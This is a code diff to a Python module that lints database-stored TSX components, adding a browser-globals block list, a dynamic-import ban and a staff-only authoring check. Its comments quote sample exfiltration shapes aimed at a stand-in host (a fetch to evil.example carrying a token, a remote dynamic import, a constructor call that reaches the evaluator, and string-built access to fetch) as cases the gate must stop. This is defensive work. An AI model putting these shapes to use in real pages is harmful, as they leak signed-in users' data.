@@ -117,11 +117,32 @@ COMPONENT_ALLOWED_IMPORTS: frozenset[str] = frozenset(
     | {
         f"@/components/ui/{name}"
         for name in (
-            "button", "input", "textarea", "card", "label", "select", "slider",
-            "switch", "tabs", "badge", "tooltip", "accordion", "collapsible",
-            "progress", "separator", "scroll-area", "dialog", "sheet",
-            "dropdown-menu", "table", "checkbox", "radio-group", "popover",
-            "avatar", "alert", "skeleton",
+            "button",
+            "input",
+            "textarea",
+            "card",
+            "label",
+            "select",
+            "slider",
+            "switch",
+            "tabs",
+            "badge",
+            "tooltip",
+            "accordion",
+            "collapsible",
+            "progress",
+            "separator",
+            "scroll-area",
+            "dialog",
+            "sheet",
+            "dropdown-menu",
+            "table",
+            "checkbox",
+            "radio-group",
+            "popover",
+            "avatar",
+            "alert",
+            "skeleton",
         )
     }
 )
@@ -199,7 +220,7 @@ COMPONENT_DESIGN_DOCTRINE = (
 #    Change BOTH sides together.
 PLATFORM_COMPONENT_CONTRACTS: dict[str, str] = {
     "CopyButtons": (
-        "import { CopyButtons } from \"@/components/agent-copy/CopyButtons\" — the "
+        'import { CopyButtons } from "@/components/agent-copy/CopyButtons" — the '
         "copy / copy-for-AI (+ optional download) pair. REQUIRED prop `label: string` "
         "(toast + tooltip text). `human?: string | (() => string)` — the plain-text "
         "copy; `agent?: AgentPayloadInput | string | (() => AgentPayloadInput | string)` "
@@ -212,7 +233,7 @@ PLATFORM_COMPONENT_CONTRACTS: dict[str, str] = {
         "strings yourself and pass them via `human` (one format) or `export` items."
     ),
     "CopyForAiButton": (
-        "import { CopyForAiButton } from \"@/components/agent-copy/CopyForAiButton\" — "
+        'import { CopyForAiButton } from "@/components/agent-copy/CopyForAiButton" — '
         "the single Copy-for-AI action. REQUIRED `label: string` and REQUIRED "
         "`agent: AgentPayloadInput | string | (() => …)`; optional `size?: 'icon' | "
         "'sm'`, `compact?: boolean` (icon-only h-6 for headers), `showLabel`, "
@@ -234,7 +255,7 @@ PLATFORM_COMPONENT_CONTRACTS: dict[str, str] = {
         "by its exact path with the named export."
     ),
     "SortableList": (
-        "import { SortableList } from \"@/components/kind-kit/SortableList\" — "
+        'import { SortableList } from "@/components/kind-kit/SortableList" — '
         "drag-to-reorder list: rows DISPLACE and a shadowed dashed placeholder marks "
         "the landing slot; grip handle; arrow buttons as keyboard/touch fallback. Props: "
         "items: readonly T[] (required; never mutated), onReorder(items: T[]) "
@@ -244,14 +265,14 @@ PLATFORM_COMPONENT_CONTRACTS: dict[str, str] = {
         "hideArrows?, emptyState?, className?, itemClassName?, ariaLabel?."
     ),
     "KindPanelGrid": (
-        "import { KindPanelGrid } from \"@/components/kind-kit/KindPanelGrid\" — "
+        'import { KindPanelGrid } from "@/components/kind-kit/KindPanelGrid" — '
         "content-aware auto-fit grid with EQUAL-HEIGHT panels. Props: children "
         "(required), minColumnWidth?: number px (default 280 — never smaller for "
         "text panels), maxColumns?, gap?: 'sm'|'md'|'lg' (default md), fill?: "
         "'auto-fit'|'auto-fill', className?."
     ),
     "KindPanel": (
-        "import { KindPanel } from \"@/components/kind-kit/KindPanel\" — header (icon "
+        'import { KindPanel } from "@/components/kind-kit/KindPanel" — header (icon '
         "· wrapping title · count · badge · spinner · at most 2 `actions` · overflow "
         "menu) → FULL-WIDTH `subline` → body → `footer` PINNED to the bottom (mt-auto) "
         "so Add/Copy align across sibling panels. Props: title (required), icon? "
@@ -262,7 +283,7 @@ PLATFORM_COMPONENT_CONTRACTS: dict[str, str] = {
         "dense?, className?, bodyClassName?."
     ),
     "KindHeaderBar": (
-        "import { KindHeaderBar } from \"@/components/kind-kit/KindHeaderBar\" — the "
+        'import { KindHeaderBar } from "@/components/kind-kit/KindHeaderBar" — the '
         "standard compact kind header: title (title_key) · stats · streaming indicator "
         "· copy bar. Props: title (required), icon? accepts `Icon` or `<Icon />`, "
         "subtitle?, stats?: [{label, value, icon? accepts either form, title?}], "
@@ -272,7 +293,7 @@ PLATFORM_COMPONENT_CONTRACTS: dict[str, str] = {
     ),
     "StreamingSkeleton": (
         "import { StreamingSkeleton, useStreamingValue, streamList, streamText } from "
-        "\"@/components/kind-kit/StreamingSkeleton\" — <StreamingSkeleton layout="
+        '"@/components/kind-kit/StreamingSkeleton" — <StreamingSkeleton layout='
         "'list'|'cards'|'table'|'text' rows={3} columns={} header label /> mimics the "
         "finished layout before data lands. useStreamingValue(value, fallback) → "
         "{value, arrived} keeps the latest DEFINED value sticky during the stream "
@@ -281,7 +302,7 @@ PLATFORM_COMPONENT_CONTRACTS: dict[str, str] = {
         "streamText(value, fallback) for strings)."
     ),
     "TagList": (
-        "import { KeywordChip, TagList } from \"@/components/kind-kit/TagList\" — chips "
+        'import { KeywordChip, TagList } from "@/components/kind-kit/TagList" — chips '
         "that WRAP and never truncate. KeywordChip: label (required), meta?, icon?, "
         "selected?, onSelect?(next), onRemove?(), onEdit?(next), disabled?, tone?: "
         "'default'|'primary'|'muted', size?: 'sm'|'md'. TagList: items (required; "
@@ -298,12 +319,12 @@ PLATFORM_COMPONENT_CONTRACTS: dict[str, str] = {
         "{lists.map(list => <KindPanel key={list.label} title={list.label} count={list."
         "keywords.length} subline={list.rationale} actions={<CopyButtons label={list."
         "label} size=\"xs\" human={() => list.keywords.join('\\n')} hide={['export']} />} "
-        "footer={<TagList items={[]} onAdd={add} addPlaceholder=\"Add keyword\" />}> "
+        'footer={<TagList items={[]} onAdd={add} addPlaceholder="Add keyword" />}> '
         "<SortableList items={list.keywords} onReorder={reorder} onRemove={remove} "
         "renderItem={(k) => <KeywordChip label={k} />} /></KindPanel>)}</KindPanelGrid>."
     ),
     "usage": (
-        "Header: <CopyButtons label=\"Reading list\" size=\"sm\" human={() => markdownText} "
+        'Header: <CopyButtons label="Reading list" size="sm" human={() => markdownText} '
         "json={() => exportObject} agent={() => ({ kind: 'reading-list', location: "
         "'Chat', description: 'A curated reading list', data: exportObject })} "
         "export={{ items: [{ id: 'csv', label: 'CSV', filename: 'list.csv', "
@@ -315,9 +336,7 @@ PLATFORM_COMPONENT_CONTRACTS: dict[str, str] = {
 }
 
 _DATA_REFERENCE_RE = re.compile(r"\bdata\b")
-_IMPORT_RE = re.compile(
-    r"""^\s*import\s+(?:[^'"]*?\s+from\s+)?['"]([^'"]+)['"]""", re.MULTILINE
-)
+_IMPORT_RE = re.compile(r"""^\s*import\s+(?:[^'"]*?\s+from\s+)?['"]([^'"]+)['"]""", re.MULTILINE)
 
 
 def component_import_lint(source: str) -> str | None:
@@ -327,6 +346,13 @@ def component_import_lint(source: str) -> str | None:
     failing, so the component mounts with undefined identifiers and breaks at
     runtime with no incident. Returns the refusal message, or None when every
     import is allowlisted."""
+    if _DYNAMIC_IMPORT_RE.search(source or ""):
+        return (
+            "This component uses a dynamic import(). The in-page compiler has "
+            "no module loader, so the call would either fail at render or "
+            "reach code nobody vetted. Import from the allowlist at the top of "
+            "the file instead."
+        )
     unknown = sorted(
         {m for m in _IMPORT_RE.findall(source or "") if m not in COMPONENT_ALLOWED_IMPORTS}
     )
@@ -340,6 +366,137 @@ def component_import_lint(source: str) -> str | None:
         "only allowlisted modules (lucide-react icons, @/components/ui/* "
         "shadcn primitives, recharts, CopyButtons/CopyForAiButton, Markdown)."
     )
+
+
+# ── THE GLOBALS GATE (Q82 / B-17, 2026-09-11) ────────────────────────────────
+# A DB-authored component is arbitrary TSX the browser compiles with
+# `new Function` INSIDE the signed-in page's own origin. The import allowlist
+# above says which modules it may pull; these lists say which browser globals it
+# may name at all — because `fetch("https://evil.example", {body: token})` needs
+# no import.
+#
+# THE LISTS ARE SHARED, not similar. The canonical copy is matrx-frontend
+# `features/agent-apps/utils/component-source-gate.json`, and
+# `tests/test_component_source_gate_parity.py` fails if these four constants
+# ever stop being byte-identical to it. Edit the JSON and both runtimes
+# together, never one of them.
+COMPONENT_BANNED_GLOBALS: tuple[str, ...] = (
+    "EventSource",
+    "WebSocket",
+    "XMLHttpRequest",
+    "fetch",
+    "importScripts",
+    "localStorage",
+    "sessionStorage",
+)
+
+# The evaluator — banned only where it is CALLED or CONSTRUCTED, because the
+# bare word `Function` is a legal TypeScript type annotation and appears in live
+# component bodies.
+COMPONENT_BANNED_CALLABLES: tuple[str, ...] = ("Function", "eval")
+
+# The same names reached as a PROPERTY (`window.fetch`, `document.cookie`,
+# `navigator.sendBeacon`) — the obvious way around a bare-identifier ban.
+# `localStorage`/`sessionStorage` are deliberately ABSENT: two live platform
+# components persist per-viewer UI state through `window.localStorage`, and
+# browser storage is not an exfiltration channel.
+COMPONENT_BANNED_MEMBER_ACCESS: tuple[str, ...] = (
+    "EventSource",
+    "Function",
+    "WebSocket",
+    "XMLHttpRequest",
+    "cookie",
+    "eval",
+    "fetch",
+    "importScripts",
+    "sendBeacon",
+)
+
+# DD-124 (2026-09-11). Three shapes this host ACCEPTED until now, all measured
+# live: `import("https://evil.example/x.js")` (the import lint above only reads
+# STATIC import statements, so dynamic import never touched it),
+# `(()=>{}).constructor("return 1")` (the Function evaluator without the word
+# Function), and `window["fet" + "ch"]` — which NO string rule can catch,
+# because the banned name never appears in the source. The first two are name
+# rules; the third is answered by refusing bracket access on the global roots
+# outright. Zero of the 162 live component bodies use any of them (read-only
+# scan, 2026-09-11), so none of this bans working code.
+
+# Banned as a METHOD CALL on any value: `x.constructor(...)`. Reading
+# `x.constructor.name` for a type label stays legal.
+COMPONENT_BANNED_MEMBER_CALLS: tuple[str, ...] = ("constructor",)
+
+# Roots that lose computed (bracket) property access entirely.
+COMPONENT_BANNED_COMPUTED_ACCESS: tuple[str, ...] = ("globalThis", "self", "window")
+
+# Syntax rules (not name lists) every runtime must implement, named so the three
+# enforcement points can be compared. `dynamicImport` = `import(...)`.
+COMPONENT_BANNED_SYNTAX: tuple[str, ...] = ("dynamicImport",)
+
+_DYNAMIC_IMPORT_RE = re.compile(r"(?<![.\w$])import\s*\(")
+
+
+def _banned_global_message(name: str) -> str:
+    return (
+        f'This component uses "{name}", which components stored in the database '
+        "may not use. They run inside the signed-in page, so anything that "
+        "reaches the network, browser storage, or the JavaScript evaluator "
+        "could read or send the reader's data. Render what the Shape hands you "
+        "in props.data and use a Shape action for anything the component needs "
+        "from the server."
+    )
+
+
+def _banned_member_call_message(name: str) -> str:
+    return (
+        f'This component calls ".{name}(", which components stored in the '
+        "database may not use. Calling a value's constructor reaches the "
+        "JavaScript evaluator, so it could run code nobody reviewed inside the "
+        "signed-in page. Write the logic out directly instead."
+    )
+
+
+def _banned_computed_access_message(name: str) -> str:
+    return (
+        f'This component uses "{name}[", which components stored in the '
+        "database may not use. Looking a property up by a computed name hides "
+        "which browser capability the component reaches, so no review can tell "
+        "whether it is safe. Name what you need directly, and use props.data "
+        "plus a Shape action for anything the component needs from the server."
+    )
+
+
+def component_globals_lint(source: str) -> str | None:
+    """Refuse the globals that let a stored component read or send whatever the
+    signed-in page can see. Returns the refusal message naming the offending
+    global, or None when the source passes.
+
+    The database backstops this with the same rule
+    (`content_ir.kind_component_source_gate`, matrx-frontend migration
+    `content_ir_kind_component_source_gate.sql`), so a write that slips past
+    this function is still refused at the table."""
+    code = source or ""
+    for name in COMPONENT_BANNED_GLOBALS:
+        if re.search(rf"(?<![.\w$]){re.escape(name)}\b", code):
+            return _banned_global_message(name)
+    for name in COMPONENT_BANNED_CALLABLES:
+        escaped = re.escape(name)
+        if re.search(rf"\bnew\s+{escaped}\s*\(", code) or re.search(
+            rf"(?<![.\w$]){escaped}\s*\(", code
+        ):
+            return _banned_global_message(name)
+    for name in COMPONENT_BANNED_MEMBER_ACCESS:
+        if re.search(rf"\.\s*{re.escape(name)}\b", code):
+            return _banned_global_message(name)
+    for name in COMPONENT_BANNED_MEMBER_CALLS:
+        if re.search(rf"\.\s*{re.escape(name)}\s*\(", code):
+            return _banned_member_call_message(name)
+    for name in COMPONENT_BANNED_COMPUTED_ACCESS:
+        if re.search(rf"(?<![.\w$]){re.escape(name)}\s*\[", code) or re.search(
+            rf"\.\s*{re.escape(name)}\s*\[", code
+        ):
+            return _banned_computed_access_message(name)
+    return None
 
 
 _ESBUILD_UNAVAILABLE_NOTE = (
@@ -381,9 +538,7 @@ async def tsx_compile_check(source: str) -> tuple[list[str], bool]:
             stdout=asyncio.subprocess.DEVNULL,
             stderr=asyncio.subprocess.PIPE,
         )
-        _, stderr = await asyncio.wait_for(
-            proc.communicate((source or "").encode()), timeout=15
-        )
+        _, stderr = await asyncio.wait_for(proc.communicate((source or "").encode()), timeout=15)
     except Exception:  # noqa: BLE001 — a broken/hung binary degrades to "unchecked"
         logger.warning("esbuild syntax gate failed to run", exc_info=True)
         return [], False
@@ -647,6 +802,69 @@ async def ensure_can_edit_kind(kind_row: Any, ctx: ToolContext) -> ToolResult | 
     )
 
 
+SHAPE_AUTHORING_REFUSAL = (
+    "Only AI Matrx staff can write shape component code right now. Custom "
+    "shape authoring opens to every organization when the isolated sandbox "
+    "that runs component code ships. The shapes you already have keep "
+    "rendering exactly as they do today — this only stops new or changed "
+    "component code from being saved."
+)
+
+
+async def is_platform_shape_author(user_id: str) -> bool:
+    """``public.is_platform_admin_for(user_id)`` — the by-user-id twin of the
+    ``is_platform_admin()`` the table's own RLS and the
+    ``zzz_component_author_gate`` trigger call. Fail-closed."""
+    if not user_id:
+        return False
+    try:
+        from matrx_orm import call_function
+
+        database = get_db_model("KindDefinition")._database
+        return bool(
+            await call_function(
+                database,
+                "public",
+                "is_platform_admin_for",
+                user_id,
+                mode="scalar",
+            )
+        )
+    except Exception:  # noqa: BLE001 — fail closed, never raise into the tool
+        logger.warning(
+            "platform-staff check failed for user %s — refusing (fail-closed)",
+            user_id,
+            exc_info=True,
+        )
+        return False
+
+
+async def ensure_platform_shape_author(ctx: ToolContext) -> ToolResult | None:
+    """B-23 / DD-123 — AUTHORING a component body is platform-staff-only.
+
+    ``component_source`` / ``props_transform`` are arbitrary TSX the browser
+    compiles with ``new Function`` inside the signed-in page's own origin.
+    Verifier V-17 showed the string gate cannot close the exfiltration class
+    (computed global access, a plain ``<img src>`` beacon). The real fix is the
+    iframe origin boundary (DD-123); until it ships the chair's ruling is that
+    only platform staff may author. The database holds the same door
+    (``zzz_component_author_gate``, migration 0639) for the browser lane — but
+    these tools run on a privileged connection where RLS and that trigger's
+    ``auth.uid()`` are both absent, so the rule is enforced HERE for this door.
+
+    Edit access to the kind is still required and checked separately; this is
+    an additional bar, never a replacement.
+    """
+    if await is_platform_shape_author(ctx_user_id(ctx) or ""):
+        return None
+    return err(
+        "forbidden",
+        SHAPE_AUTHORING_REFUSAL,
+        "Ask an AI Matrx platform admin to author or change this component, or "
+        "use the built-in shape components until custom authoring opens.",
+    )
+
+
 async def ensure_can_view_kind(kind_row: Any, ctx: ToolContext) -> ToolResult | None:
     """Viewer gate for every read tool. Denials are content-free — the same
     not-found shape a missing id produces, so unauthorized probes learn
@@ -802,6 +1020,7 @@ def collect_child_kind_fields(sample: dict[str, Any], root_slug: str) -> dict[st
     — mixed-slug lists raise, because one edge row records one child kind.
     Deeper nesting belongs to the child's own definition (created recursively).
     """
+
     def _normalized_child_slug(raw: str, field: str) -> str:
         # 🚨 SLUG HYGIENE (2026-08-26 incident): a child's `__kind` marker used
         # to be trusted verbatim — an agent-authored PascalCase marker
